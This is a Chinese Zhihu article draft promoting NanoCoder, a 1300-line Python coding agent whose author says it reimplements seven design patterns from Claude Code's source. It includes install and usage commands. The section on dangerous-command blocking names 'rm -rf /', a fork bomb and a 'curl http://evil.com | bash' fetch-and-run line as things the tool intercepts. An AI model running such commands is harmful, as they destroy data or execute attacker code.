# 知乎文章草稿 1：NanoCoder 引流

**标题方案（选一个）**：
- A: 分析完 Claude Code 51 万行源码后，我用 1300 行 Python 重写了它的核心
- B: 我从 Claude Code 源码里提炼了 7 个设计模式，然后用 1300 行 Python 全部实现了
- C: 用 DeepSeek 跑 Claude Code？我写了个 1300 行的开源替代

---

上一篇文章发出来之后（17 万阅读，感谢支持），评论区问得最多的两个问题：

1. "所以 Claude Code 的核心到底是怎么实现的？能不能给个 Python 版的参考实现？"
2. "国内用不了 Anthropic 的 API，有没有支持 DeepSeek/Qwen 的替代品？"

这篇一次性回答这两个问题。

---

## 先说结论

我花了一个周末，从 Claude Code 的 51.2 万行 TypeScript 源码中提炼出 7 个核心设计模式，用 **1300 行 Python** 从零实现了一个完整可用的 AI 编程 Agent。

项目叫 **NanoCoder**。MIT 协议，GitHub 上开源。支持任何 OpenAI 兼容的大模型——DeepSeek、Qwen、Kimi、GLM、Ollama 本地模型都行。

GitHub：https://github.com/he-yufeng/NanoCoder

"1300 行能干什么？"直接看效果：

```
$ nanocoder -m deepseek-chat

You > 读一下 main.py，修掉拼错的 import

> read_file(file_path='main.py')
> edit_file(file_path='main.py', old_string='from utils import halper',
            new_string='from utils import helper')

--- a/main.py
+++ b/main.py
@@ -1,4 +1,4 @@
-from utils import halper
+from utils import helper

修好了，halper → helper。
```

它会读代码、做精准编辑（每次改动输出 unified diff）、跑命令、搜索代码库。跟 Claude Code 一样的工作流。

---

## 不是又一个 Claude Code 克隆

先声明定位。市面上已经有了 Claw-Code（12万+ star，完整的 Python/Rust 重写）、Aider、Cline 等等。如果你要一个开箱即用的 AI 编程工具，用那些。

NanoCoder 走的是另一条路。

类比一下：想学 GPT 的训练过程，你不会去读 Megatron-LM 的几十万行代码。你会先看 Andrej Karpathy 的 nanoGPT——300 行代码把核心讲清楚，然后你拿 nanoGPT 去做自己的实验。

NanoCoder 对 AI 编程 Agent 的意义就是 nanoGPT 对 Transformer 的意义。**它不是一个产品，是一份可运行的参考实现。** 代码量只有 Claude Code 的 1/400，但关键设计模式全部保留。

---

## 从 51 万行里提炼了什么

读完整个代码库之后，我觉得 Claude Code 里真正"承重"的设计模式就 7 个。其他几十万行——UI 渲染、MCP 协议、OAuth、Skill 系统、宠物系统——虽然也有意思，但不是 Agent 的核心。

以下逐一解释我提炼了什么、为什么重要、在 NanoCoder 里怎么实现的。

### 1. 搜索替换式编辑

**Claude Code 最重要的创新。**

传统方案要么用行号补丁（LLM 记不住行号，尤其在上下文压缩之后）、要么整文件重写（500 行文件改 2 行也要全部重新生成，费 token 还容易出格式错误）、要么让 LLM 输出 diff 格式（`@@` 行号经常算错）。

Claude Code 的做法：LLM 指定一段精确的、**在文件中唯一出现**的文本，和替换后的内容。如果出现 0 次说明记错了，大于 1 次说明上下文不够。只有恰好 1 次才执行替换。

就这一个约束，干掉了一整类编辑 bug。NanoCoder 完整实现了这个模式，而且加了 unified diff 输出——每次编辑后你能看到 `--- a/file +++ b/file` 格式的精确变更。

### 2. Agent 工具循环 + 并行执行

核心循环：用户说话 → 调 LLM → LLM 返回工具调用 → 执行工具 → 结果喂回 LLM → 重复，直到 LLM 给出纯文本。

Claude Code 的 `StreamingToolExecutor`（530 行）在模型**还没说完**的时候就开始执行工具。模型流式吐出第一个 tool_use 块的参数，那个工具立刻开始跑。多个只读工具并行执行，有副作用的独占执行。

NanoCoder 用 ThreadPoolExecutor 做了并行——当 LLM 一次返回多个工具调用时，线程池同时执行。比完整的流式解析简单得多，但性能收益接近。

### 3. 三层上下文压缩

128K token 十几轮工具调用就快满了。Claude Code 用四层策略：
- 第一层：裁冗长的工具输出（保留头尾，删中间）
- 第二层：LLM 驱动的旧对话摘要（带缓存）
- 第三层：硬压缩（只留最近几轮 + 一段总结）
- 第四层：后台自动触发

NanoCoder 实现了前三层。不同信息有不同的"保质期"——工具中间输出几轮后就没用了，但用户的需求描述整个会话都要保留。按保质期分级处理，比一刀切的截断好得多。

### 4. 子代理生成

复杂任务拆成子任务，每个子 Agent 有自己的 128K 上下文。子 Agent 不能再创建子 Agent（防递归爆炸）。结果压缩成一段文字返回给主 Agent。

Claude Code 的 AgentTool 有 1397 行。NanoCoder 的是 50 行。核心逻辑一样：创建新 Agent 实例，传任务描述，过滤掉 agent 工具，跑完返回结果。

### 5. 危险命令拦截

`rm -rf /`、fork bomb、`curl http://evil.com | bash`——在执行前就拦下来。Claude Code 的 BashTool 有 1143 行的安全检查（命令分类、沙箱、交互式命令检测、大输出管理）。NanoCoder 实现了 9 个最关键的正则检测。

### 6. 会话持久化

Claude Code 的 QueryEngine（1295 行）管理跨轮次的会话状态。NanoCoder 做了一个 JSON 版本：`/save` 把消息历史存盘，`nanocoder -r session_id` 恢复。

### 7. 系统提示词动态组装

不是一个写死的字符串。根据当前工作目录、OS、可用工具列表、甚至具体模型版本动态拼接。Claude Code 的 `prompts.ts` 有 914 行。NanoCoder 的 `prompt.py` 是 35 行精简版。

---

## 怎么用

安装：

```bash
pip install nanocoder
```

用 DeepSeek（国内推荐）：

```bash
export OPENAI_API_KEY=你的key
export OPENAI_BASE_URL=https://api.deepseek.com
nanocoder -m deepseek-chat
```

用本地 Ollama：

```bash
export OPENAI_API_KEY=ollama
export OPENAI_BASE_URL=http://localhost:11434/v1
nanocoder -m qwen2.5-coder
```

支持的 LLM：OpenAI、DeepSeek、Qwen、Kimi、GLM、Ollama、vLLM、OpenRouter、Together AI——只要是 OpenAI 兼容 API 就行。

也可以当 Python 库用：

```python
from nanocoder import Agent, LLM

llm = LLM(model="deepseek-chat", api_key="sk-...", base_url="https://api.deepseek.com")
agent = Agent(llm=llm)
response = agent.chat("找出项目里所有 TODO 注释")
```

添加自定义工具大概 20 行代码。

---

## 配套的源码导读

代码之外，我还写了一套 **7 篇的 Claude Code 架构导读**。不是复述目录结构那种——每篇围绕一个核心设计模式展开，有代码引用，有工程权衡分析，有跟 NanoCoder 实现的对照。

目录：
1. 从 51 万行说起：技术栈、目录结构、十大设计哲学
2. 1729 行的 while(true)：Agent 核心循环
3. 让 AI 安全地改你的代码：工具系统和搜索替换编辑
4. 有限窗口，无限任务：四层上下文压缩
5. 边想边做：StreamingToolExecutor 的流式工具并行
6. 当一个 Claude 不够用：多 Agent 协作系统
7. Feature Flag 背后的秘密：44 个未发布功能

全部在 GitHub 上：https://github.com/he-yufeng/NanoCoder/tree/main/article

---

## 最后

51 万行源码的核心设计，1300 行 Python 复刻。7 个工具，33 个测试全过，CI 跑在 GitHub Actions 上。

如果你在做 AI Agent 方向的开发、想搞懂编程 Agent 的工作原理、或者需要一个支持国产大模型的编程 Agent 基底——NanoCoder 应该能帮上忙。

GitHub：https://github.com/he-yufeng/NanoCoder

觉得有用的话给个 Star，有问题评论区见。
